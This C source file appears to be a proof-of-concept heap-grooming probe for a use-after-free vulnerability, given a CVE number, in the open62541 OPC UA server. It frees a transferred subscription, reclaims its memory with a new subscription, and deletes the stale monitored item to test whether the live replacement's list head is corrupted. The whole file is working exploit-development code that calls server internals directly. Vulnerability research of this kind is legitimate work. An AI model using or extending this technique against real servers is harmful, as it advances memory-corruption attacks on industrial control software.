/* Throwaway rung-4 grooming probe for CVE-2026-126962.
 * Frees the old subscription, reclaims its 352-byte chunk with a live new
 * subscription via real Service_CreateSubscription, then deletes the stale
 * monitored item and inspects the live replacement's sampling list head.
 */
#include <open62541/server.h>
#include <open62541/client_subscriptions.h>
#include <open62541/server_config_default.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stddef.h>
#include "src/server/ua_server_internal.h"
#include "src/server/ua_services.h"
#include "src/server/ua_session.h"
#include "src/server/ua_subscription.h"

static void ok(int c, const char *msg) {
    printf("%s %s\n", c ? "PASS" : "FAIL", msg);
    if(!c) exit(2);
}
static UA_Boolean allow_all(UA_Server *s, UA_AccessControl *ac,
                            const UA_NodeId *os, void *oc,
                            const UA_NodeId *ns, void *nc) {
    (void)s;(void)ac;(void)os;(void)oc;(void)ns;(void)nc; return true;
}
static void *mon_ptr(UA_Server *server, UA_UInt32 subId, UA_UInt32 monId) {
    void *p = NULL;
    lockServer(server);
    UA_Subscription *s = getSubscriptionById(server, subId);
    if(s) {
        UA_MonitoredItem *mi;
        LIST_FOREACH(mi, &s->monitoredItems, listEntry)
            if(mi->monitoredItemId == monId) { p = mi; break; }
    }
    unlockServer(server);
    return p;
}
static UA_UInt32 create_sub(UA_Server *server, UA_Session *sess) {
    UA_CreateSubscriptionRequest req;
    UA_CreateSubscriptionRequest_init(&req);
    req.requestedPublishingInterval = 100.0;
    req.requestedLifetimeCount = 10000;
    req.requestedMaxKeepAliveCount = 10;
    req.publishingEnabled = true;
    UA_CreateSubscriptionResponse resp;
    UA_CreateSubscriptionResponse_init(&resp);
    lockServer(server);
    Service_CreateSubscription(server, sess, &req, &resp);
    unlockServer(server);
    ok(resp.responseHeader.serviceResult == UA_STATUSCODE_GOOD &&
       resp.subscriptionId != 0, "Service_CreateSubscription succeeded");
    return resp.subscriptionId;
}
static UA_UInt32 create_publish_mon(UA_Server *server, UA_Session *sess,
                                    UA_UInt32 subId, double interval) {
    UA_NodeId node = UA_NODEID_NUMERIC(0, UA_NS0ID_SERVER_SERVERSTATUS_CURRENTTIME);
    UA_MonitoredItemCreateRequest mreq = UA_MonitoredItemCreateRequest_default(node);
    mreq.requestedParameters.samplingInterval = interval;
    UA_CreateMonitoredItemsRequest req;
    UA_CreateMonitoredItemsRequest_init(&req);
    req.subscriptionId = subId;
    req.timestampsToReturn = UA_TIMESTAMPSTORETURN_BOTH;
    req.itemsToCreateSize = 1;
    req.itemsToCreate = &mreq;
    UA_CreateMonitoredItemsResponse resp;
    UA_CreateMonitoredItemsResponse_init(&resp);
    lockServer(server);
    Service_CreateMonitoredItems(server, sess, &req, &resp);
    unlockServer(server);
    ok(resp.responseHeader.serviceResult == UA_STATUSCODE_GOOD &&
       resp.resultsSize == 1 && resp.results[0].statusCode == UA_STATUSCODE_GOOD &&
       resp.results[0].monitoredItemId != 0, "Service_CreateMonitoredItems succeeded");
    return resp.results[0].monitoredItemId;
}
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("INFO sizeof(UA_Subscription)=%zu offset(samplingMonitoredItems)=%zu\n",
           sizeof(UA_Subscription), offsetof(UA_Subscription, samplingMonitoredItems));
    UA_Server *server = UA_Server_new();
    ok(server != NULL, "server created");
    server->config.accessControl.allowTransferSubscription = allow_all;
    UA_Session *src = &server->adminSession;
    UA_Session dst; UA_Session_init(&dst);
    dst.sessionId = UA_NODEID_NUMERIC(1, 4242);
    dst.validTill = UA_INT64_MAX;

    UA_UInt32 oldId = create_sub(server, src);
    lockServer(server);
    UA_Subscription *oldSub = getSubscriptionById(server, oldId);
    double interval = oldSub->publishingInterval;
    unlockServer(server);
    UA_UInt32 oldMon = create_publish_mon(server, src, oldId, interval);
    void *oldMonPtr = mon_ptr(server, oldId, oldMon);
    printf("INFO oldMon=%u oldMonPtr=%p\n", oldMon, oldMonPtr);

    UA_TransferSubscriptionsRequest treq;
    UA_TransferSubscriptionsRequest_init(&treq);
    treq.subscriptionIdsSize = 1;
    treq.subscriptionIds = &oldId;
    UA_TransferSubscriptionsResponse tresp;
    UA_TransferSubscriptionsResponse_init(&tresp);
    lockServer(server);
    Service_TransferSubscriptions(server, &dst, &treq, &tresp);
    unlockServer(server);
    ok(tresp.resultsSize == 1 && tresp.results[0].statusCode == UA_STATUSCODE_GOOD,
       "Service_TransferSubscriptions succeeded");

    lockServer(server);
    UA_Subscription_delete(server, oldSub);
    unlockServer(server);
    for(int i = 0; i < 40; i++) { UA_Server_run_iterate(server, false); usleep(10000); }
    printf("INFO oldSub=%p freed after delayed callback\n", (void*)oldSub);

    UA_UInt32 newId = create_sub(server, &dst);
    lockServer(server);
    UA_Subscription *newSub = getSubscriptionById(server, newId);
    void *oldHead = newSub ? newSub->samplingMonitoredItems.lh_first : NULL;
    printf("INFO newSub=%p newId=%u same_chunk=%d oldHeadBefore=%p\n",
           (void*)newSub, newId, newSub == oldSub, oldHead);
    unlockServer(server);

    UA_UInt32 newMon = create_publish_mon(server, &dst, newId, interval);
    void *newMonPtr = mon_ptr(server, newId, newMon);
    printf("INFO newMon=%u newMonPtr=%p aliased_with_old_mon=%d\n",
           newMon, newMonPtr, newMonPtr == oldMonPtr);
    lockServer(server);
    void *headBefore = newSub->samplingMonitoredItems.lh_first;
    printf("INFO replacementHeadBefore=%p\n", headBefore);
    unlockServer(server);

    UA_DeleteMonitoredItemsRequest dreq;
    UA_DeleteMonitoredItemsRequest_init(&dreq);
    dreq.subscriptionId = oldId;
    dreq.monitoredItemIdsSize = 1;
    dreq.monitoredItemIds = &oldMon;
    UA_DeleteMonitoredItemsResponse dresp;
    UA_DeleteMonitoredItemsResponse_init(&dresp);
    if(!getenv("OA_SKIP_DELETE")) {
        lockServer(server);
        Service_DeleteMonitoredItems(server, &dst, &dreq, &dresp);
        unlockServer(server);
        ok(dresp.responseHeader.serviceResult == UA_STATUSCODE_GOOD, "delete stale monitored item completed");
    }

    lockServer(server);
    void *headAfter = newSub->samplingMonitoredItems.lh_first;
    int liveCount = 0;
    UA_MonitoredItem *mi;
    LIST_FOREACH(mi, &newSub->samplingMonitoredItems, sampling.subscriptionSampling)
        liveCount++;
    printf("INFO replacementHeadAfter=%p samplingCountAfter=%d changed=%d\n",
           headAfter, liveCount, headBefore != headAfter);
    unlockServer(server);
    if(getenv("OA_RUN_SAMPLING")) {
        for(int i = 0; i < 10; i++) UA_Server_run_iterate(server, false);
        puts("INFO post-write sampling loop survived");
    }
    UA_Server_delete(server);
    puts("RESULT GROOM PROBE COMPLETE");
    return 0;
}
